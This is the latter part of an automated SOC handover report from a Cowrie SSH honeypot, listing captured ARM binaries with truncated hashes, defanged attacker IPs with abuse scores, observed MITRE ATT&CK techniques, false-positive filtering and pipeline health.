| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `143.198.80[.]171` | SG | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `100.27.216[.]66` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 5 |
| `66.132.195[.]81` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `66.132.195[.]111` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `3.22.100[.]15` | US | Amazon Technologies Inc. | **100** ⚠️ | 2 |
| `103.214.112[.]253` | ID | PT Denbe Anugerah Solusindo | **100** ⚠️ | 7 |
| `109.186.48[.]70` | IL | 013 Netvision | **100** ⚠️ | 1 |
| `20.153.204[.]5` | JP | Microsoft Corporation | **100** ⚠️ | 50 |
| `103.167.89[.]222` | VN | JOBKEY JOINT STOCK COMPANY | **100** ⚠️ | 31 |
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 296 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 179 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 103 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 53 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 53 |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 10 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 396 cases |
| Tool 34  | Credential Extractor        | ✅ 282 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 37 filtered (9.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 33 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 99 priority case(s) shown individually · 28 recon entry/entries in table (18 group(s) consolidating 250 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-07T14:01:37Z_
